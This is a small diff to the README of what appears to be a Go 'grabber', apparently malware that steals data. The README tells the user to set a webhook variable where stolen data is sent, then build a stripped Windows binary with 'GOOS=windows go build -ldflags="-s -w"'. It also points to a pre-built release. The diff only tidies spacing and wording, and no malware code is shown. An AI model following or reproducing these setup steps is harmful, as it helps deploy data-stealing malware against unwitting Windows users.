@@ -13,14 +13,14 @@ If you wanna get fun then you could follow those steps:
 
 ```
 var(
-	webhook = "THIS"
+    webhook = "THIS"
 )
 ```
 - then compile the gr4bber using
 ```
 GOOS=windows go build -ldflags="-s -w" main.go
 ```
-<b>There you go, get fun ;).</b>
+<b>There you go.</b>
 
 Or if you prefer, you could just download <a href="#">pre-build release</a> and get fun ;).
 <u>Coming Soon</u>
